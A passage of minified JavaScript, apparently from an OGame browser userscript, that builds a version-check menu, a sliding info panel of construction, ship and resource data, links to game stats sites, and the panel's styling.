paddingTop:"3px"},e));e=h.create("div",null,{background:'url("http://gf1.geo.gfsrv.net/cdn9e/4f73643e86a952be4aed7fdd61805a.gif") repeat-y scroll 5px 0px transparent',color:"rgb(132, 132, 132)",margin:"0px",padding:"17px 0px 10px",width:"100%",textAlign:"center"});if(c)for(g=0;g<c.childNodes.length;g++)j="true"===c.childNodes[g].childNodes[3].textContent?"green":"#FF4B00",f=c.childNodes[g].childNodes[0].textContent,b=c.childNodes[g].childNodes[2].textContent,j=h.create("p",null,{padding:"3px 0px",
color:j},f),j.appendChild(h.create("a",{href:b,target:"_blank"},{textDecoration:"none"}," ( link ) ")),e.appendChild(j);c=h.create("div",null,{background:'url("http://gf1.geo.gfsrv.net/cdn30/aa3e8edec0a2681915b3c9c6795e6f.gif") no-repeat scroll 2px 0px transparent',height:"17px"});b=h.create("div",{id:"oGameVersionCheck"});b.appendChild(d);b.appendChild(e);b.appendChild(c);h.prepend(a,b)}}var j,f,g,k,l;if(j=document.getElementById("menuTableTools")){f=document.getElementById("oGameVersionCheckData");
f||(g=document.createElement("li"),g.addEventListener("click",d,!1),f=g.appendChild(document.createElement("div")),f.id="oGameVersionCheckData",f.style.display="none",k=g.appendChild(document.createElement("a")),k.id="oGameVersionCheckMenuButton",k.className="menubutton",k.href="javascript:void(0)",l=k.appendChild(document.createElement("span")),l.className="textlabel",l.textContent={BA:"Skripte",CZ:"Skripty",GR:"\u03a3\u03b5\u03bd\u03ac\u03c1\u03b9\u03b1",HU:"Szkriptek",JP:"\u30b9\u30af\u30ea\u30d7\u30c8",
NO:"Skript",PL:"Skrypty",RO:"Scripturi",RU:"\u0441\u0446\u0435\u043d\u0430\u0440\u0438\u0438",SE:"Skript",SI:"Skripti",SK:"Skripty",TR:"Scriptler",TW:"\u811a\u672c"}[e.server]||"Scripts",h.prepend(j,g));if(f&&(j=n.parseVersion(b)>=n.parseVersion(e.ogameVersion),g=document.createElement("span"),g.style.display="none",l=g.appendChild(document.createElement("span")),l.textContent=a||"",l=g.appendChild(document.createElement("span")),l.textContent=b||"",l=g.appendChild(document.createElement("span")),
l.textContent=c||"",l=g.appendChild(document.createElement("span")),l.textContent=j||"",f.appendChild(g),(k=k||document.getElementById("oGameVersionCheckMenuButton"))&&!j))a=6,window.localStorage&&(b=window.localStorage.getItem("OGameVersionCheck")||"",a=parseInt(b.split("|")[1],10)||0,b.split("|")[0]!==e.ogameVersion&&(a=0)),6>a&&"#FF4B00"!==k.style.color&&(window.localStorage&&window.localStorage.setItem("OGameVersionCheck",e.ogameVersion+"|"+(a+1)),k.style.color="#FF4B00");j=f=g=k=l=null}}},y=
{MouseStatus:!1,Run:function(){!y.status&&e.is("I00")&&(y.status=4,y.width=n.d(e.get("I05"),190),y.height=n.d(e.get("I06"),600),y.sections=Wa.check(m.getStorageObject("InfoPanel"),["I20","I30","I40"]),y.ShowActiveZone(),e.is("I01")&&y.Show())},ShowActiveZone:function(){var a,b;if(a=document.getElementById("info"))b=h.createA({id:"ago_icon"}),b.addEventListener("click",y.slideInNow,!1),b.addEventListener("mouseover",y.slideIn,!1),b.addEventListener("mouseout",y.slideOut,!1),b.appendChild(h.create("img",
{src:"data:image/png;base64,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%3D%3D",
"class":"ago_icon"})),a.appendChild(b)},Show:function(){var a,b,c,d;if(4===y.status&&(b=y.getPositions(),a=document.getElementById("box"))){y.status=6;b=h.create("div",{id:"ago_panel"},{width:b.width,minHeight:b.height,top:b.top,left:b.left});b.addEventListener("click",y.slideIn,!1);b.addEventListener("mouseover",y.slideOver,!1);b.addEventListener("mouseout",y.slideOutNow,!1);for(d in y.sections)c=b.appendChild(h.create("div",{id:"ago_panel_"+d,"class":"ago_panel_section"})),c.appendChild(h.create("div",
{"class":"ago_panel_section_header"},null,e.label(d))).addEventListener("click",y.changeSection,!1),c.appendChild(h.create("div",{"class":"ago_panel_section_overview"})),c.appendChild(h.create("div",{"class":"ago_panel_section_content"})),y.sections[d].status&&y.ShowTab(d,y.sections[d].value,y.sections[d].details,!1,c);a.appendChild(b)}},ShowTab:function(a,b,c,d,e){var f,g;e?f=!0:e=a?document.getElementById("ago_panel_"+a):null;if(e&&a&&y.sections[a]){y.sections[a].status=!0;h.addClass(e,"ago_panel_section_open");
if(!f){for(g in y.sections)y.sections[g].status&&("I10"!==g&&g!==a)&&(y.sections[g].status=!1,h.removeClass("#ago_panel_"+g,"ago_panel_section_open",e.parentNode));d&&(y.sections[a].value=b||"",y.sections[a].details=c||"");m.setStorageObject("InfoPanel",y.sections);h.removeEventCacheAll("infopanel_"+a);e.children[1].innerHTML="";e.children[2].innerHTML=""}"I20"===a&&y.createTabTools(e.children[2],a,b,c);"I30"===a&&(y.createTabConstructionsOverview(e.children[1],a,b,c),y.createTabConstructionsContent(e.children[2],
a,b,c));"I40"===a&&(y.createTabShipsOverview(e.children[1],a,b,c),y.createTabShipsContent(e.children[2],a,b,c));f||y.slideIn()}},addConstruction:function(a){var b;a&&10<a.length&&(f.setTaskQueue("Constructions",a,1,1,1),b=a.split(":",4).join(":"),y.Show(),y.ShowTab("I30",b+":0",a,!0))},createTabConstructionsOverview:function(a,b,c){var d,j,g,k,l,n,q,p;d=h.create("table",{"class":"ago_panel_overview"});n=m.splitStorageObject(m.getStorage("Constructions"));for(l in f.Planets)if(n[f.Planets[l].coordstype]){q=
n[f.Planets[l].coordstype].split(",");for(k=0;k<q.length;k++)p=f.splitTask(q[k],1,1),j=d.appendChild(document.createElement("tr")),j.setAttribute("data-panel",b),j.setAttribute("data-panel-value",f.Planets[l].coordstype+":"+k),j.setAttribute("data-panel-detail",q[k]),c===f.Planets[l].coordstype+":"+k&&(j.className=f.Planets[l].type===T?"ago_color_planet":"ago_color_moon"),h.addEvent(j,"click",y.clickConstruction,!1,null,"infopanel_"+b),g=j.appendChild(document.createElement("td")),g.className="ago_panel_overview_coords",
g.textContent=f.Planets[l].coords||"",f.Planets[l].type===Y&&(g=g.appendChild(document.createElement("img")),g.style.width="11px",g.style.height="11px",g.src=w.urlTypeIcon(Y)),g=j.appendChild(document.createElement("td")),g.className="ago_panel_overview_name",g.textContent=e.label("L"+r.trimZero(p.name,3)),g=j.appendChild(document.createElement("td")),g.className="ago_panel_overview_status",g.textContent=p.detail||""}a.appendChild(d)},createTabConstructionsContent:function(a,b,c,d){var j,g,k,l;g=
d?f.splitTask(d,1,1):{};l=g.coords?f.PlanetsByCoordstype[g.coords+":"+g.type]:"";if(c&&l){d=document.createElement("ul");d.className="ago_panel_contentlist";j=d.appendChild(document.createElement("li"));j.className="ago_panel_contentlist_header";j.textContent=e.label("B11");c=j.appendChild(h.createA({"class":"ago_panel_contentlist_value icon icon_delete","data-panel-value":c},{}));h.addEvent(c,"click",y.deleteConstruction,!1,null,"infopanel_"+b);c={};for(k in g)c[k]=g[k];for(k in f.ItemResource)g[k]&&
(j=d.appendChild(document.createElement("li")),j.textContent=f.getItemLabel(k),j=j.appendChild(document.createElement("span")),j.className="ago_panel_contentlist_value",j.textContent=r.formatNumber(g[k]));if(f.Units[l])for(k in j=d.appendChild(document.createElement("li")),j.className="ago_panel_contentlist_header",j.textContent=e.label("B12"),f.ItemResource)c[k]=Math.max(c[k]-(+f.Units[l][k]||0),0),0<g[k]&&(j=d.appendChild(document.createElement("li")),j.textContent=f.getItemLabel(k),j=j.appendChild(document.createElement("span")),
j.className="ago_panel_contentlist_value text_palered",j.textContent=r.formatNumber(c[k]));j=d.appendChild(document.createElement("li"));j.className="ago_panel_contentlist_header";j.textContent=e.label("I50");if(l!==f.PlanetsActive.id){j=d.appendChild(document.createElement("li"));j.className="ago_panel_contentlist_header";j.textContent=e.label("B15");c.resources=0;for(k in f.ItemResource)0<c[k]&&(j=d.appendChild(document.createElement("li")),j.textContent=f.getItemLabel(k),j=j.appendChild(document.createElement("span")),
j.className="ago_panel_contentlist_value "+(f.UnitsActive[k]>=c[k]?"text_lightgreen":"text_palered"),j.textContent=r.formatNumber(f.UnitsActive[k]),c[k]=Math.min(c[k],f.UnitsActive[k]),c.resources+=c[k]);"fleet1"===e.page&&(j=d.appendChild(document.createElement("li")),j.className="ago_panel_contentlist_header",c=j.appendChild(h.createA({"class":"",rel:f.joinTask(c,1)},{},e.label("F60"))),h.addEvent(c,"click",y.clickConstructionCalculator,!1,null,"infopanel_"+b))}a.appendChild(d)}},createTabTools:function(a,
b){var c,d,j,g,f,k,l,m;for(g=1;9>=g;g++){c=h.create("ul",{"class":"ago_panel_contentlist"});c.appendChild(h.create("li",{"class":"ago_panel_contentlist_header"},null,e.label("T"+g+"0")));m=["A","B","C","D","E","F",1,2,3,4,5,6,7,8,9];for(f=0;f<m.length;f++)if(j="T"+g+m[f],e.is(j)){if(k=aa.getLink(j),l=e.Data[j][X]===x?k?e.getPair(j)[0]:"":e.label(j))d=c.appendChild(document.createElement("li")),d=d.appendChild(h.createA({href:k,rel:j},null,l)),k&&(d.target="ago_tools_"+j),h.addEvent(d,"click",y.clickTool,
!1,null,"infopanel_"+b)}else if(1<m[f])break;1<c.children.length&&(c.appendChild(h.create("li",{"class":"ago_panel_contentlist_space"},null,"","&nbsp;")),a.appendChild(c))}},createTabShipsOverview:function(a,b,c){var d,e,g,k,l,m;m="total"!==c?f.getPlanetId(c,!0):"";d=h.create("table",{"class":"ago_panel_overview"});e=d.appendChild(h.create("tr",{"data-panel":"I40","data-panel-value":"total"}));e.className="total"===c?"ago_color_planet":"";e.appendChild(h.create("th",{colspan:"3"},null," Total / Auto"));
h.addEvent(e,"click",y.clickShip,!1,null,"infopanel_"+b);for(g=1;g<f.PlanetsByIndex.length;g++)if((k=f.PlanetsByIndex[g])&&f.Planets[k].type===T)l=f.Planets[k].moon,e=d.appendChild(document.createElement("tr")),e.setAttribute("data-panel",b),e.setAttribute("data-panel-value",f.Planets[k].coordstype),e.className=k===m?"ago_color_planet":l===m?"ago_color_moon":"",h.addEvent(e,"click",y.clickShip,!1,null,"infopanel_"+b),c=e.appendChild(document.createElement("td")),c.className="ago_panel_overview_coords",
c.textContent=f.Planets[k].coords||"",c=e.appendChild(document.createElement("td")),c.className="ago_panel_overview_name",c.textContent=f.Planets[k].name||"",c=e.appendChild(document.createElement("td")),c.className="ago_panel_overview_status",l&&(c.setAttribute("data-panel-value",f.Planets[l].coordstype),e=c.appendChild(document.createElement("img")),e.src=f.Planets[l].img||""),e=c.appendChild(document.createElement("span")),e.style.backgroundColor=f.getUnitsStatusColor(f.getUnits(k)),e=c.appendChild(document.createElement("span")),
e.style.backgroundColor=l?f.getUnitsStatusColor(f.getUnits(l)):"inherit";a.appendChild(d)},createTabShipsContent:function(a,b,c){var d,j,g,h;b={ItemResource:"Resources",ItemShipCivil:"Civil ships",ItemShipCombat:"Combat ships"};if("total"===c){c={timeResource:1,timeShips:1};for(g in b)for(h in f[g])c[h]=0;for(d in f.Planets)for(h in j=f.getUnits(d),j)h in c&&(c[h]+=j[h])}else c=f.getUnits(c,!0);for(g in b)for(h in c[g]=0,f[g])c[h]&&(c[g]+=c[h]);for(g in b){d=document.createElement("ul");d.className=
"ago_panel_contentlist";j=d.appendChild(document.createElement("li"));j.className="ago_panel_contentlist_header";j.textContent=e.label(b[g]);j=j.appendChild(document.createElement("span"));j.className="ago_panel_contentlist_value";if("ItemResource"===g&&c.timeResource||"ItemResource"!==g&&c.timeShips)for(h in j.textContent=r.formatNumber(c[g]),f[g]){if(c[h]||"ItemResource"===g)j=d.appendChild(document.createElement("li")),j.textContent=f.getItemLabel(h),j=j.appendChild(document.createElement("span")),
j.className="ago_panel_contentlist_value",j.textContent=r.formatNumber(c[h])}else j.textContent="---";a.appendChild(d)}},clickConstruction:function(a){var b,c;a.currentTarget&&(b=a.currentTarget.getAttribute("data-panel"),c=a.currentTarget.getAttribute("data-panel-value"),a=a.currentTarget.getAttribute("data-panel-detail"),y.ShowTab(b,c,a,!0))},clickConstructionCalculator:function(a){a.currentTarget&&k.setTaskCalculator(a.currentTarget.getAttribute("rel"))},deleteConstruction:function(a){var b,c,
d;if(a.currentTarget&&(b=a.currentTarget.getAttribute("data-panel-value")))if(a=b.split(":",4).join(":"),d=+b.split(":")[4]||0,(b=a?m.splitStorageObject(m.getStorage("Constructions")):"")&&b[a])c=b[a].split(","),c.splice(d,1),b[a]=c.join(","),m.setStorage("Constructions",m.joinStorageObject(b)),y.ShowTab("I30")},clickShip:function(a){var b;a.currentTarget&&(b=a.currentTarget.getAttribute("data-panel"),a=a.target.getAttribute("data-panel-value")||a.target.parentNode.getAttribute("data-panel-value")||
a.currentTarget.getAttribute("data-panel-value"),"total"===a&&y.sections[b].value===a&&(a=""),y.ShowTab(b,a,"",!0))},clickTool:function(a){var b,c,d;if(a&&a.currentTarget)if(b=a.currentTarget.rel,"T1A"===b)aa.showTool(b,aa.getOgniterLink($.currentPlayerId,2));else if("T1B"===b)aa.showTool(b,aa.getInfuzaLink($.currentPlayerName,2));else if("T1C"===b)aa.showTool(b,aa.getWarRidersLink($.currentPlayerName,2));else if("T2A"===b)aa.showCumulative();else if(e.is(b)&&(c=$.currentPlayerId,d=$.currentPlayerName,
b=aa.getLink(b,2,c,d)))a.currentTarget.href=b},styles:function(){q.setCache(["#ago_infobox { margin: 0px; padding: 0px; display: block; width: 170px; height: auto; margin:0 0 25px 0; }","#ago_infobox { float: left; background: #0D1014; border: 1px solid black; border-radius: 5px; }",".ago_infobox_header { padding-top: 4px; height: 22px;  background: url(/cdn/img/layout/detail-spriteset.png) no-repeat scroll -162px -214px; background-size: 580px 316px; }","#ago_infobox_title { padding-left: 10px; font-weight: bold; font-size: 12px; color: "+
q.color.textLight+"; }","#ago_infobox a.close_details { margin-right: 4px; margin-bottom: 4px; }","#ago_infobox td { padding: 0 4px; }",".ago_infobox_player { text-align: center; white-space: nowrap; overflow: hidden; width: 110px; max-width: 110px; font-size: 10px; color: "+q.color.textBlue+"; }",".ago_infobox_coords a { text-align: center; white-space: nowrap; overflow: hidden; font-size: 10px; text-decoration: none; line-height: 18px; }"]);e.is("I00")&&q.setCache(["#ago_panel { z-index: 20; position: absolute; background-color: #0D1014; border: 1px solid black; z-index: 5; opacity: "+
n.minMax(e.get("I07",100),10,100)/100+"; margin: 0 0 25px 0; }","#ago_panel.active { opacity: 1.0; }",".ago_panel_section_header { color: "+q.color.textBlue+"; font-size: 12px; font-weight: 400; text-align: center; padding: 2px; background:#13181D; border: 1px solid #000000; cursor: pointer; }",".ago_panel_section_header:hover { background-color: #32495A; }",".ago_panel_section_overview, .ago_panel_section_content{ display: none; margin: 4px 4px 15px 4px; }",".ago_panel_section_open .ago_panel_section_overview, .ago_panel_section_open .ago_panel_section_content { display: block; }",
"#ago_panel { color: "+q.color.textNormal+"; font-size: 11px; line-height: 14px; padding: 0px; }","#ago_panel a { color: "+q.color.textNormal+"; font-size: 11px; text-decoration: none; line-height: 16px; display: inline-block; padding: 0 4px; }","#ago_panel a:hover { color: "+q.color.textWhite+"; background-color: #32495A; }","#ago_panel ul { position: relative; }","#ago_panel .ago_panel_contentlist_value { position: absolute; right: 0px; }","#ago_panel li.ago_panel_contentlist_space { font-size: 6px; line-height: 6px; }",
"#ago_panel #ago_panel_I20 a { width: 100%; }","#ago_panel #ago_panel_I20 .ago_panel_contentlist li { margin: 0 10px 0 10px; }","#ago_panel #ago_panel_I20 .ago_panel_contentlist li.ago_panel_contentlist_header { color: "+q.color.textBlue+"; margin: 0; }","#ago_panel #ago_panel_I30 .ago_panel_contentlist li { margin: 0 10px 0 10px; }","#ago_panel #ago_panel_I30 .ago_panel_contentlist li.ago_panel_contentlist_header { color: "+q.color.textBlue+"; margin: 5px 0 5px 0; }","#ago_panel #ago_panel_I40 .ago_panel_contentlist li { margin: 0 10px 0 10px; }",
"#ago_panel #ago_panel_I40 .ago_panel_contentlist li.ago_panel_contentlist_header { color: "+q.color.textBlue+"; margin: 10px 0 5px 0; }",".ago_panel_overview { width: 100%; }",".ago_panel_overview tr { cursor: pointer; }",".ago_panel_overview tr:hover { background-color: #32495A; }",".ago_panel_overview th { height: 18px; text-align: center; }",".ago_panel_overview td { height: 15px; }",".ago_panel_overview_coords { min-width: 66px; max-width: 66px; }",".ago_panel_overview_name { min-width: 86px; max-width: 86px; overflow: hidden; white-space: nowrap; }",
".ago_panel_overview_status { min-width: 40px; max-width: 40px; text-align: right; }",".ago_panel_overview_status img {  width: 14px; height: 14px; float: left; padding: 0 6px; }",".ago_panel_overview_status span { width: 3px; height: 9px; display: inline-block; margin: 0 1px; }"])},changeSection:function(a,b){var c,d;if(c=a&&a.currentTarget?a.currentTarget.parentNode:b?document.getElementById("ago_panel_"+b):null){for(d in y.sections)y.sections[d].status=g("#ago_panel_"+d).hasClass("ago_panel_section_open");
if((b=b||(c.id||"").split("_")[2])&&y.sections[b])y.sections[b].status=!y.sections[b].status,y.sections[b].status?y.ShowTab(b):(h.removeClass(c,"ago_panel_section_open"),m.setStorageObject("InfoPanel",y.sections))}},viewTab:function(a){4<=y.status&&(a&&a.currentTarget)&&(y.Show(),y.ShowTab(a.currentTarget.getAttribute("data-panel"),a.currentTarget.getAttribute("data-panel-value"),a.currentTarget.getAttribute("data-panel-detail"),!0))},slideOver:function(){y.MouseStatus=!0;6<=y.status&&(y.MouseStatus=
!0,h.addClass("#ago_panel","active"))},slideInNow:function(){y.Show();y.slideIn()},slideOutNow:function(){y.slideOut(null,!0)},slideIn:function(){var a,b;if(6<=y.status&&(y.MouseStatus=!0,b=y.getPositions(),a=document.getElementById("ago_panel")))b.slide&&a.style.left!==b.slideLeft&&(a.style.left=b.slideLeft),h.addClass(a,"active")},slideOut:function(a,b){6<=y.status&&(y.MouseStatus=!1,setTimeout(function(){var a,b;if(!y.MouseStatus&&(b=y.getPositions(),a=document.getElementById("ago_panel")))a.style.left!==
b.left&&(a.style.left=b.left),h.removeClass(a,"active")},b?200:1400))},getPositions:function(){var a,b,c,d;a=n.minMax(y.width,200,300);b=n.minMax(y.height,400,1E3);c=-(a+10);d=Math.ceil(Math.max(q.maxWidth()-1020,2)/-2);return{slide:c<d,width:a+"px",height:b+"px",top:"45px",left:c+"px",slideLeft:d+"px"}}},aa={getLink:function(a,b,c,d){var j,g,f,h;if(e.is(a)&&(a=e.Data[a][X]===x?e.getPair(a)[1]||"":e.getMore(a)?"":e.getDetail(a))){"http://"!==a.slice(0,7)&&"https://"!==a.slice(0,8)&&(a="http://"+a);
a=a.split("[");for(f=1;f<a.length;f++)j=a[f].split("]"),g=j[0],j[0]="","ALLIANCE"===g?(j[0]=c,h=1):"ALLIANCETAG"===g?(j[0]=d,h=1):"PLAYER"===g?(j[0]=c,h=2):"PLAYERNAME"===g&&(j[0]=d,h=2),a[f]=j.join("");if(!b||!h||b===h)return encodeURI(a.join(""))}return""},getWarRidersLink:function(a,b){var c,d;c={DE:"de",ES:"es",FR:"fr",PL:"pl",US:"us",ORG:"org"}[e.server];d=a&&1===b?"&page=details&type=ally&name="+a:a&&2===b?"&page=details&type=player&name="+a:"";return"http://ogame.gamestats.org/?lang="+c+"&uni="+
